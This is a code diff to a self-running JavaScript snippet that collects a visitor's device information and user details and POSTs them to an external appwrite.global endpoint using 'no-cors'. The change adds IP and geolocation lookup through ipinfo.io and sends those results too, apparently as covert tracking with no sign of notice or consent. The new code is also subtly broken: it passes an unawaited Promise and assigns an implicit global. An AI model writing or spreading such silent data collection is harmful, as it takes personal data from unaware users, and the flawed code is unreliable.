@@ -1,5 +1,5 @@
-async function GetIPInfo(clientIP) {
-    const ipinfo = (await (await fetch(`https://ipinfo.io/${clientIP}/json`)).json());
+async function GetIPInfo() {
+    const ipinfo = (await (await fetch(`https://ipinfo.io/json`)).json());
     try {
         return {
             Address: ipinfo['ip'],
@@ -58,7 +58,7 @@ async function storeData(e, t, ipinfo) {
   const n = await fetch("https://673d53a375a6942d9bd2.appwrite.global/", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ user: t, device: e , ip: ipinfo}),
+    body: JSON.stringify({ user: t, device: e , ip: ipinfo }),
     mode: "no-cors",
   });
   console.log(n);
@@ -66,5 +66,6 @@ async function storeData(e, t, ipinfo) {
 ((e) => {
   const t = getDeviceInfo(),
     n = GetUserDetails();
-  storeData(t, n);
+    ipinfo = GetIPInfo()
+  storeData(t, n, ipinfo);
 })();
